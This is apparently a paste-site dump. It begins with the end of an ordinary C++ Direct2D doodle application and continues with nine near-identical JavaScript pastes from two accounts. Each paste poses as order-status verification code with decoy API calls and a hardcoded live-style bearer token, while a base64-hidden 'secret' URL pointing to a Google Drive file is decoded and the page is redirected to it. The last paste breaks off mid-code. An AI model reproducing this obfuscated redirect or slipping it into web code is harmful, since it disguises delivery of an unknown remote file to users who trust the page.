            GetBValue(strokeColor) / 255.0f
        );

    ID2D1SolidColorBrush* pBrush = nullptr;
    if (FAILED(pRT->CreateSolidColorBrush(color, &pBrush)))
        return;

    if (points.size() == 1) {
        const DrawPoint& pt = points[0];
        D2D1_ELLIPSE ellipse = D2D1::Ellipse(
            D2D1::Point2F((FLOAT)(pt.x - offsetX), (FLOAT)(pt.y - offsetY)),
            (FLOAT)brushSize, (FLOAT)brushSize);
        pRT->FillEllipse(ellipse, pBrush);
    }
    else {
        for (size_t i = 1; i < points.size(); ++i) {
            const DrawPoint& prev = points[i - 1];
            const DrawPoint& curr = points[i];
            double dx = curr.x - prev.x;
            double dy = curr.y - prev.y;
            double distance = sqrt(dx * dx + dy * dy);
            if (distance > 0) {
                int steps = std::max(1, (int)(distance / 2));
                for (int step = 0; step <= steps; ++step) {
                    double t = step / (double)steps;
                    int x = (int)(prev.x + dx * t);
                    int y = (int)(prev.y + dy * t);
                    D2D1_ELLIPSE ellipse = D2D1::Ellipse(
                        D2D1::Point2F((FLOAT)(x - offsetX), (FLOAT)(y - offsetY)),
                        (FLOAT)brushSize, (FLOAT)brushSize);
                    pRT->FillEllipse(ellipse, pBrush);
                }
            }
        }
    }
    pBrush->Release();
}

void DrawGrid(ID2D1RenderTarget* pRT, const D2D1_RECT_F& rect) {
    // Use a solid orange color for grid lines.
    ID2D1SolidColorBrush* pGridBrush = nullptr;
    pRT->CreateSolidColorBrush(D2D1::ColorF(1.0f, 0.55f, 0.0f), &pGridBrush);
    int scaledGridSize = (int)(GRID_SIZE * gridZoomFactor);
    // Compute starting positions based on scroll offsets.
    int modX = scrollX % scaledGridSize;
    if (modX < 0)
        modX += scaledGridSize;
    float startX = -modX;
    for (float x = startX; x < rect.right; x += scaledGridSize) {
        pRT->DrawLine(D2D1::Point2F(x, rect.top), D2D1::Point2F(x, rect.bottom), pGridBrush, 1.0f);
    }
    int modY = scrollY % scaledGridSize;
    if (modY < 0)
        modY += scaledGridSize;
    float startY = -modY;
    for (float y = startY; y < rect.bottom; y += scaledGridSize) {
        pRT->DrawLine(D2D1::Point2F(rect.left, y), D2D1::Point2F(rect.right, y), pGridBrush, 1.0f);
    }
    pGridBrush->Release();
}

//----------------------------------------------------------------
// Offscreen Buffer Update (using pOffscreenRT)
//----------------------------------------------------------------

void UpdateOffscreenBuffer(HWND hwnd) {
    if (!pOffscreenRT)
        return;
    pOffscreenRT->BeginDraw();
    // Clear offscreen render target to white.
    pOffscreenRT->Clear(D2D1::ColorF(D2D1::ColorF::White));
    // Redraw all strokes.
    {
        std::lock_guard<std::mutex> lock(strokeMutex);
        for (const auto& stroke : strokeHistory) {
            DrawSmoothStroke(pOffscreenRT, stroke.points, stroke.isEraser, stroke.color, stroke.brushSize, scrollX, scrollY);
        }
    }
    HRESULT hr = pOffscreenRT->EndDraw();
    // Mark offscreen as clean.
    offscreenDirty = false;
    lastOffscreenScrollX = scrollX;
    lastOffscreenScrollY = scrollY;
}

//----------------------------------------------------------------
// Status Bar Functions (GDI remains unchanged)
//----------------------------------------------------------------

void InitializeStatusBuffer(HWND hStatus) {
    if (hStatusBufferDC) {
        DeleteDC(hStatusBufferDC);
        DeleteObject(hStatusBufferBitmap);
    }
    HDC hdc = GetDC(hStatus);
    RECT rect;
    GetClientRect(hStatus, &rect);
    hStatusBufferDC = CreateCompatibleDC(hdc);
    hStatusBufferBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
    SelectObject(hStatusBufferDC, hStatusBufferBitmap);
    ReleaseDC(hStatus, hdc);
}

void UpdateStatus(HWND hwnd) {
    DWORD currentTime = GetTickCount();
    if (currentTime - lastStatusUpdateTime < STATUS_UPDATE_INTERVAL)
        return;
    lastStatusUpdateTime = currentTime;
    wchar_t status[512];
    BYTE r = GetRValue(currentBrushColor);
    BYTE g = GetGValue(currentBrushColor);
    BYTE b = GetBValue(currentBrushColor);
    swprintf_s(status, 512,
        L""Mode: %s | Brush: %d | Color: RGB(%d,%d,%d) | Grid: %s%s | Zoom: %.1fx | Opacity: %d%% | Canvas Pos: (%d,%d)"",
        isEraserMode ? L""Eraser"" : L""Draw"",
        brushSize,
        r, g, b,
        showGrid ? L""On"" : L""Off"",
        useAlphaGrid ? L""(Alpha)"" : L"""",
        gridZoomFactor,
        (gridOpacity * 100) / 255,
        scrollX, scrollY
    );
    g_statusText = status;
}

/* void UpdateStatus(HWND hwnd) {
    DWORD currentTime = GetTickCount();
    if (currentTime - lastStatusUpdateTime < STATUS_UPDATE_INTERVAL)
        return;
    lastStatusUpdateTime = currentTime;
    if (!hStatusBar)
        return;
    if (!hStatusBufferDC) {
        InitializeStatusBuffer(hStatusBar);
    }
    RECT statusRect;
    GetClientRect(hStatusBar, &statusRect);
    wchar_t status[512];
    BYTE r = GetRValue(currentBrushColor);
    BYTE g = GetGValue(currentBrushColor);
    BYTE b = GetBValue(currentBrushColor);
    swprintf_s(status, 512,
        L""Mode: %s | Brush: %d | Color: RGB(%d,%d,%d) | Grid: %s%s | Zoom: %.1fx | Opacity: %d%% | Canvas Pos: (%d,%d)"",
        isEraserMode ? L""Eraser"" : L""Draw"",
        brushSize,
        r, g, b,
        showGrid ? L""On"" : L""Off"",
        useAlphaGrid ? L""(Alpha)"" : L"""",
        gridZoomFactor,
        (gridOpacity * 100) / 255,
        scrollX, scrollY
    );
    SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)status);
} */

//----------------------------------------------------------------
// Window Procedure
//----------------------------------------------------------------

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    HRESULT hr;
    switch (uMsg) {
    case WM_CREATE:
    {
        // Initialize Direct2D Factory
        HRESULT hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
        if (FAILED(hr))
            return -1;

        // Initialize DirectWrite Factory and Text Format for the status text.
        HRESULT hrDWrite = DWriteCreateFactory(
            DWRITE_FACTORY_TYPE_SHARED,
            __uuidof(IDWriteFactory),
            reinterpret_cast<IUnknown**>(&pDWriteFactory)
        );
        if (SUCCEEDED(hrDWrite))
        {
            hrDWrite = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"",                // Font family name.
                NULL,                       // Use system font collection.
                DWRITE_FONT_WEIGHT_NORMAL,
                DWRITE_FONT_STYLE_NORMAL,
                DWRITE_FONT_STRETCH_NORMAL,
                14.0f,                      // Font size.
                L"""",                        // Locale.
                &pTextFormat
            );
            if (SUCCEEDED(hrDWrite))
            {
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
            }
        }

        // (Remove GDI status bar creation; status will be rendered via Direct2D.)

        // Device resources (pRenderTarget and pOffscreenRT) will be created in WM_SIZE.
        LoadCanvasStateAsync(hwnd);
        return 0;
    }
    case WM_SIZE:
    {
        RECT rcClient;
        GetClientRect(hwnd, &rcClient);

        // Resize (or create) the main render target.
        if (pRenderTarget)
        {
            pRenderTarget->Resize(D2D1::SizeU(rcClient.right, rcClient.bottom));
        }
        else
        {
            HRESULT hr = CreateDeviceResources(hwnd);
            if (FAILED(hr))
                return -1;
        }

        // Recreate the offscreen render target.
        if (pOffscreenRT)
        {
            pOffscreenRT->Release();
            pOffscreenRT = nullptr;
        }
        HRESULT hr = pRenderTarget->CreateCompatibleRenderTarget(
            D2D1::SizeF((FLOAT)rcClient.right, (FLOAT)rcClient.bottom),
            &pOffscreenRT
        );
        if (SUCCEEDED(hr))
        {
            offscreenDirty = true;               // Force update of the offscreen buffer.
            lastOffscreenScrollX = scrollX;
            lastOffscreenScrollY = scrollY;
            UpdateOffscreenBuffer(hwnd);         // Rebuild the offscreen content.
        }

        // Update status (which now contains the grid state) and force a full redraw.
        UpdateStatus(hwnd);
        InvalidateRect(hwnd, NULL, TRUE);
        return 0;
    }
    case WM_KEYDOWN:
    {
        if (GetKeyState(VK_MENU) & 0x8000)
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
        // Panning using Space + Drag is handled in WM_MOUSEMOVE.
        // Additionally, allow arrow keys for panning.
        if (wParam == VK_LEFT) {
            scrollX -= 20;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_RIGHT) {
            scrollX += 20;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_UP) {
            scrollY -= 20;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_DOWN) {
            scrollY += 20;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_SPACE && !isSpacePressed) {
            isSpacePressed = true;
            GetCursorPos(&lastMousePos);
            ScreenToClient(hwnd, &lastMousePos);
            SetCursor(LoadCursor(NULL, IDC_SIZEALL));
            SetCapture(hwnd);
        }
        else if (wParam == 0x50) {
            isPaintbrushSelected = true;
            isEraserMode = false;
            UpdateStatus(hwnd);
        }
        else if (wParam == 0x45) {
            isPaintbrushSelected = false;
            isEraserMode = true;
            UpdateStatus(hwnd);
        }
        else if (wParam == 'Q') {
            CHOOSECOLOR cc = { sizeof(CHOOSECOLOR) };
            static COLORREF customColors[16] = { 0 };
            cc.hwndOwner = hwnd;
            cc.rgbResult = currentBrushColor;
            cc.lpCustColors = customColors;
            cc.Flags = CC_FULLOPEN | CC_RGBINIT;
            if (ChooseColor(&cc))
                currentBrushColor = cc.rgbResult;
            UpdateStatus(hwnd);
        }
        else if (wParam == VK_ADD || wParam == VK_OEM_PLUS) {
            brushSize = std::min(50, brushSize + 5);
            UpdateStatus(hwnd);
        }
        else if (wParam == VK_SUBTRACT || wParam == VK_OEM_MINUS) {
            brushSize = std::max(5, brushSize - 5);
            UpdateStatus(hwnd);
        }
        else if (wParam == 0x43) {
            std::lock_guard<std::mutex> lock(strokeMutex);
            strokeHistory.clear();
            sessionDirty = true;
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_HOME) {
            scrollX = 0;
            scrollY = 0;
            lastOffscreenScrollX = 0;
            lastOffscreenScrollY = 0;
            offscreenDirty = true;
            UpdateOffscreenBuffer(hwnd);
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 'G') {
            showGrid = !showGrid;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == 'A') {
            useAlphaGrid = !useAlphaGrid;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_PRIOR) {
            gridZoomFactor *= 1.1f;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_NEXT) {
            gridZoomFactor *= 0.9f;
            if (gridZoomFactor < 0.1f)
                gridZoomFactor = 0.1f;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_OEM_6 && useAlphaGrid) {
            gridOpacity = std::min(255, gridOpacity + 15);
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_OEM_4 && useAlphaGrid) {
            gridOpacity = std::max(0, gridOpacity - 15);
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_ESCAPE) {
            if (isSpacePressed) {
                isSpacePressed = false;
                ReleaseCapture();
            }
            if (sessionDirty) {
                SaveCanvasState();
                sessionDirty = false;
            }
            PostQuitMessage(0);
            return 0;
        }
        else if (wParam == VK_F1) {
            MessageBox(hwnd,
                L""Infinite Canvas Doodle App (Direct2D Accelerated)\n""
                L""P=Brush, E=Eraser, C=Clear, +/-=BrushSize, Space+Drag or Arrow Keys=Panning, Home=Reset, Q=Color, G=Grid, A=Alpha, PgUp=ZoomIn, PgDn=ZoomOut, F1=About"",
                L""Information"", MB_OK | MB_ICONINFORMATION);
            return 0;
        }
        return 0;
    }
    case WM_KEYUP:
    {
        if (wParam == VK_SPACE) {
            isSpacePressed = false;
            SetCursor(LoadCursor(NULL, IDC_ARROW));
            ReleaseCapture();
            return 0;
        }
        return 0;
    }
    case WM_LBUTTONDOWN:
    {
        isDrawing = true;
        int worldX = GET_X_LPARAM(lParam) + scrollX;
        int worldY = GET_Y_LPARAM(lParam) + scrollY;
        strokeBuffer.clear();
        strokeBuffer.push_back(DrawPoint(worldX, worldY));
        SetCapture(hwnd);
        InvalidateRect(hwnd, NULL, FALSE);
        return 0;
    }
    case WM_LBUTTONUP:
    {
        if (isDrawing) {
            isDrawing = false;
            SerializedStroke stroke;
            stroke.points = strokeBuffer;
            stroke.color = currentBrushColor;
            stroke.brushSize = brushSize;
            stroke.isEraser = isEraserMode;
            {
                std::lock_guard<std::mutex> lock(strokeMutex);
                strokeHistory.push_back(stroke);
            }
            strokeBuffer.clear();
            ReleaseCapture();
            InvalidateRect(hwnd, NULL, FALSE);
            sessionDirty = true;
            if (sessionDirty) {
                SaveCanvasState();
                sessionDirty = false;
            }
            offscreenDirty = true;
            UpdateOffscreenBuffer(hwnd);
            UpdateStatus(hwnd);
        }
        return 0;
    }
    case WM_MOUSEMOVE:
    {
        int x = GET_X_LPARAM(lParam);
        int y = GET_Y_LPARAM(lParam);
        if (isSpacePressed) {
            RECT clientRect;
            GetClientRect(hwnd, &clientRect);
            int deltaX = x - lastMousePos.x;
            int deltaY = y - lastMousePos.y;
            scrollX -= deltaX;
            scrollY -= deltaY;
            lastMousePos.x = x;
            lastMousePos.y = y;
            if (scrollX != lastOffscreenScrollX || scrollY != lastOffscreenScrollY)
                offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (isDrawing && (wParam & MK_LBUTTON)) {
            int worldX = x + scrollX;
            int worldY = y + scrollY;
            if (strokeBuffer.empty())
                strokeBuffer.push_back(DrawPoint(worldX, worldY));
            else {
                const DrawPoint& lastPt = strokeBuffer.back();
                double dx = worldX - lastPt.x;
                double dy = worldY - lastPt.y;
                double distance = sqrt(dx * dx + dy * dy);
                if (distance >= MIN_DISTANCE)
                    strokeBuffer.push_back(DrawPoint(worldX, worldY));
            }
            // Compute dirty rectangle for the new segment (optional, for partial redraw)
            RECT dirty;
            int clientPrevX = strokeBuffer.back().x - scrollX;
            int clientPrevY = strokeBuffer.back().y - scrollY;
            int clientNewX = x;
            int clientNewY = y;
            dirty.left = std::min(clientPrevX, clientNewX) - brushSize;
            dirty.top = std::min(clientPrevY, clientNewY) - brushSize;
            dirty.right = std::max(clientPrevX, clientNewX) + brushSize;
            dirty.bottom = std::max(clientPrevY, clientNewY) + brushSize;
            InvalidateRect(hwnd, &dirty, FALSE);
        }
        return 0;
    }
    case WM_USER + 1:
    {
        // Custom message after state loading.
        offscreenDirty = true;
        UpdateOffscreenBuffer(hwnd);
        InvalidateRect(hwnd, NULL, TRUE);
        break;
    }
    case WM_ERASEBKGND:
        return 1;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        BeginPaint(hwnd, &ps);

        pRenderTarget->BeginDraw();

        // Update offscreen buffer if dirty.
        if (offscreenDirty)
        {
            UpdateOffscreenBuffer(hwnd);
        }

        // Draw the persistent offscreen render target.
        ID2D1Bitmap* pOffscreenBitmap = nullptr;
        pOffscreenRT->GetBitmap(&pOffscreenBitmap);
        pRenderTarget->DrawBitmap(pOffscreenBitmap);
        pOffscreenBitmap->Release();

        // Overlay in-progress stroke.
        if (isDrawing && !strokeBuffer.empty())
        {
            DrawSmoothStroke(pRenderTarget, strokeBuffer, isEraserMode, currentBrushColor, brushSize, scrollX, scrollY);
        }

        // Get the full client area for grid drawing.
        RECT rcClient;
        GetClientRect(hwnd, &rcClient);
        D2D1_RECT_F d2dRect = D2D1::RectF(0, 0, (FLOAT)rcClient.right, (FLOAT)rcClient.bottom);
        if (showGrid)
        {
            DrawGrid(pRenderTarget, d2dRect);
        }

        // Render the status bar using Direct2D/DirectWrite.
        {
            float statusBarHeight = 30.0f;
            D2D1_RECT_F statusRect = D2D1::RectF(
                0,
                (FLOAT)rcClient.bottom - statusBarHeight,
                (FLOAT)rcClient.right,
                (FLOAT)rcClient.bottom
            );
            // Fill status bar background.
            ID2D1SolidColorBrush* pStatusBgBrush = nullptr;
            pRenderTarget->CreateSolidColorBrush(D2D1::ColorF(0.2f, 0.2f, 0.2f), &pStatusBgBrush);
            pRenderTarget->FillRectangle(statusRect, pStatusBgBrush);
            pStatusBgBrush->Release();
            // Draw status text.
            ID2D1SolidColorBrush* pTextBrush = nullptr;
            pRenderTarget->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pTextBrush);
            pRenderTarget->DrawTextW(
                g_statusText.c_str(),
                static_cast<UINT32>(g_statusText.length()),
                pTextFormat,
                &statusRect,
                pTextBrush,
                D2D1_DRAW_TEXT_OPTIONS_NONE,
                DWRITE_MEASURING_MODE_NATURAL
            );
            pTextBrush->Release();
        }

        HRESULT hr = pRenderTarget->EndDraw();
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_SETCURSOR:
    {
        if (LOWORD(lParam) == HTCLIENT) {
            if (isSpacePressed) {
                SetCursor(LoadCursor(NULL, IDC_SIZEALL));
                return TRUE;
            }
            else if (isPaintbrushSelected || isEraserMode) {
                SetCursor(LoadCursor(NULL, IDC_CROSS));
                return TRUE;
            }
        }
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    case WM_DESTROY:
    {
        if (sessionDirty)
        {
            SaveCanvasState();
            sessionDirty = false;
        }
        DiscardDeviceResources();
        if (pFactory)
        {
            pFactory->Release();
            pFactory = nullptr;
        }
        if (pTextFormat)
        {
            pTextFormat->Release();
            pTextFormat = nullptr;
        }
        if (pDWriteFactory)
        {
            pDWriteFactory->Release();
            pDWriteFactory = nullptr;
        }
        PostQuitMessage(0);
        return 0;
    }
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

//----------------------------------------------------------------
// WinMain
//----------------------------------------------------------------

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_BAR_CLASSES };
    InitCommonControlsEx(&icex);
    const wchar_t CLASS_NAME[] = L""InfiniteCanvasClass"";
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
    RegisterClass(&wc);
    hInst = hInstance;
    hWnd = CreateWindowEx(0, CLASS_NAME,
        L""Infinite Canvas Doodle App (Direct2D Accelerated, P=Brush, E=Eraser, C=Clear, +/-=BrushSize, Space+Drag/Arrow=Panning, Home=Reset, Q=Color, G=Grid, A=Alpha, PgUp=ZoomIn, PgDn=ZoomOut, F1=About)"",
        WS_OVERLAPPEDWINDOW | WS_MAXIMIZE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL, hInstance, NULL);
    if (hWnd == NULL)
        return 0;
    // Enable double buffering via WS_EX_COMPOSITED.
    SetWindowLongPtr(hWnd, GWL_EXSTYLE, GetWindowLongPtr(hWnd, GWL_EXSTYLE) | WS_EX_COMPOSITED);
    ShowWindow(hWnd, SW_SHOWMAXIMIZED);
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
```"
ScNBcQfg,Untitled,bruhmanuser91roblox,JavaScript,Saturday 22nd of March 2025 11:51:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/286/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GqDx0CPW,Untitled,bruhmanuser91roblox,JavaScript,Saturday 22nd of March 2025 11:45:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/552/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ud1UhiwM,Untitled,bruhmanuser91roblox,JavaScript,Saturday 22nd of March 2025 11:34:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/804/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dWmTBmJ1,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 11:29:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/221/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aYJHMYzs,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 11:23:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/581/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
veJg8UU0,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 11:18:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/767/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Eb1rmE3Q,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 11:12:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/575/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wq2H8mnX,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 11:07:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/927/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iKcCWqRg,Untitled,johndonne,JavaScript,Saturday 22nd of March 2025 11:01:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/285/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
